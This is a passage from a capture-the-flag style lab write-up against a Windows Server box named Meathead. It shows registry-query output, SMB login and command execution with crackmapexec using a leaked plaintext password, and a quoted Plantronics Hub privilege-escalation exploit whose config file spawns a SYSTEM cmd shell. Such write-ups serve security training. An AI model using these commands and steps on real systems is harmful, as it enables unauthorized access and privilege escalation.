allapi.dll,-38544|EmbedCtxt=@%SystemRoot%\system32\firewallapi.dll,-38525|         

NULL                                                                               

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UmPass                        

    DisplayName    REG_SZ    @umpass.inf,%UmPass.SVCDESC%;Microsoft UMPass Driver   

NULL                                                                               

End of search: 443 match(es) found.                                                

NULL                                                                               

SQL>
```

## Credentials Leak

```bash
┌──(kali㉿kali)-[/tmp]
└─$ crackmapexec smb 192.168.137.70 -u jane -p TwilightAirmailMuck234                                                                                               1 ⚙
SMB         192.168.137.70  445    MEATHEAD         [*] Windows Server 2019 Standard 17763 x64 (name:MEATHEAD) (domain:Meathead) (signing:False) (SMBv1:True)
SMB         192.168.137.70  445    MEATHEAD         [+] Meathead\jane:TwilightAirmailMuck234 
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ crackmapexec smb 192.168.137.70 -u jane -p TwilightAirmailMuck234 -x "whoami"                                                                                   1 ⚙
SMB         192.168.137.70  445    MEATHEAD         [*] Windows Server 2019 Standard 17763 x64 (name:MEATHEAD) (domain:Meathead) (signing:False) (SMBv1:True)
SMB         192.168.137.70  445    MEATHEAD         [+] Meathead\jane:TwilightAirmailMuck234 
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$
```


![](Pasted%20image%2020220321190422.png)

# Privesc

```bash
┌──(kali㉿kali)-[/tmp]
└─$ cat MajorUpgrade.config                                            
jane|advertise|C:\Windows/System32/cmd.exe
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cat 47845.txt ]
# Exploit Title: Plantronics Hub 3.13.2 - Local Privilege Escalation
# Date: 2020-01-2
# Exploit Author: Markus Krell - @MarkusKrell
# Vendor Homepage: https://support.polycom.com/content/dam/polycom-support/global/documentation/plantronics-hub-local-privilege-escalation-vulnerability.pdf
# Software Link: https://www.plantronics.com/content/dam/plantronics/software/PlantronicsHubInstaller-3.13.2.exe
# Version: Plantronics Hub for Windows prior to version 3.14
# Tested on: Windows 10 Enterprise
# CVE : N/A

As a regular user drop a file called "MajorUpgrade.config" inside the "C:\ProgramData\Plantronics\Spokes3G" directory. The content of MajorUpgrade.config should look like the following one liner:
<WINDOWS-USERNAME>|advertise|<FULL-PATH-TO-YOUR-DESIRED-PAYLOAD>

Exchange <WINDOWS-USERNAME> with your local (non-administrative) username. Calling cmd.exe is the most basic exploitation, as it will spawn a system shell in your (unprivileged) windows session.
You may of course call any other binary you can plant on the machine.

Steps for exploitation (PoC):
- Open cmd.exe
- Navigate using cd C:\ProgramData\Plantronics\Spokes3G
- echo %username%^|advertise^|C:\Windows\System32\cmd.exe > MajorUpgrade.configcat: ]: No such file or directory
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

![](Pasted%20image%2020220321192503.png)

# Others